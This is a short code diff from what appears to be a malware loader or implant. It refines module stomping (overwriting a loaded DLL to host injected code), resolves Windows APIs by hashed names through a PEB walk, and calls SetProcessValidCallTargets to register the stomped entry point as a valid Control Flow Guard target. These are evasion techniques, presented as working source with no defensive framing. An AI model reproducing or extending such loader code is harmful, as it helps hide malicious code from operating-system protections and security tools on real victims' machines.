@@ -82,10 +82,11 @@ FUNC VOID Main(
 #elif NAX_STOMP_MODE == NAX_STOMP_MODULE
     if ( !RESOLVE( LoadLibraryExW, Kernel32 ) ) return;
 
-    RESOLVE( GetProcessMitigationPolicy, Kernel32 );
-    MOD( Kernelbase ) = LdrModulePeb( HASH_STR( "KERNELBASE.DLL" ) );
-    if ( MOD( Kernelbase ) )
+    MOD( Kernelbase ) = LdrModulePeb( H_MODULE_KERNELBASE );
+    if ( MOD( Kernelbase ) ) {
+        RESOLVE( GetProcessMitigationPolicy, Kernelbase );
         API( SetProcessValidCallTargets ) = (__typeof__( API( SetProcessValidCallTargets ) ))LdrFunction( MOD( Kernelbase ), HASH_STR( "SetProcessValidCallTargets" ) );
+    }
 #endif
 
 #if NAX_EXEC_MODE == NAX_EXEC_THREAD
@@ -154,7 +155,7 @@ FUNC VOID Main(
             PIMAGE_NT_HEADERS cfgNt = NaxPeHeaders( Instance()->StompDllBase );
             if ( cfgNt ) {
                 SIZE_T cfgLen = ALIGN_UP( cfgNt->OptionalHeader.SizeOfImage, LDR_PAGE_SIZE );
-                struct { ULONG_PTR Offset; ULONG_PTR Flags; } cfg = { U_PTR( entry ) - U_PTR( Instance()->StompDllBase ), LDR_CFG_CALL_TARGET_VALID };
+                struct { ULONG_PTR Offset; ULONG_PTR Flags; } cfg = { U_PTR( entry ) - U_PTR( Instance()->StompDllBase ), LDR_CFG_CALL_TARGET_VALID | LDR_CFG_CALL_TARGET_CONVERT_EXPORT };
                 API( SetProcessValidCallTargets )( (HANDLE)-1, Instance()->StompDllBase, cfgLen, 1, &cfg );
             }
         }
